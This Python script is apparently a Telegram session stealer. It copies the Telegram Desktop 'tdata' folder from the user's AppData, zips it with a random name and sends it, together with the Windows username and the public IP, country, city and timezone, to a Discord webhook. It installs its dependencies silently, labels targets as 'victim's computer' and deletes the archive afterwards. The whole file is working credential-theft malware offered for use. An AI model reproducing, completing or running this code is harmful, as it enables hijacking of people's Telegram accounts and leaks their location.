import os
import shutil
from tempfile import TemporaryDirectory
from random import choices

try:
    import discord
    from requests import get
except ImportError:
    os.system("pip install discord")
    os.system("pip install audioop-lts")
    os.system("pip install requests")
    import discord
    from requests import get


DISCORD_WEBHOOK_URL = ""

TELEGRAM_PATH = os.path.join(os.getenv("APPDATA"), "Telegram")
TEMP_PATH = os.getenv("TEMP")


def random_string(len):
    return ''.join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=len))


def send_webhook_message(username, ip_info, file_path=None):
    content = (
        "```"
        f"Username: {username}\n"
        f"IP: {ip_info['ip']}\n"
        f"Location: {ip_info['country']}, {ip_info['city']}\n"
        f"Timezone: {ip_info['timezone']}"
        "```"
    )

    webhook = discord.SyncWebhook.from_url(DISCORD_WEBHOOK_URL)

    if file_path:
        webhook.send(content=content, file=discord.File(file_path))
    else:
        webhook.send(content=content + "```Telegram not found on victim's computer```")


def main():
    username = os.getlogin()
    ip_info = get("https://ipwhois.app/json/").json()

    if not os.path.exists(TELEGRAM_PATH):
        send_webhook_message(username, ip_info)
        return
    
    tdata_folder = os.path.join(TELEGRAM_PATH, "tdata")

    with TemporaryDirectory() as temp:
        shutil.copytree(
            tdata_folder, temp, dirs_exist_ok=True,
            ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp")
        )

        archive_dir = os.path.join(TEMP_PATH, random_string(6))
        shutil.make_archive(archive_dir, "zip", temp)

        send_webhook_message(username, ip_info, file_path=f"{archive_dir}.zip")

    os.remove(f"{archive_dir}.zip")


if __name__ == "__main__":
    main()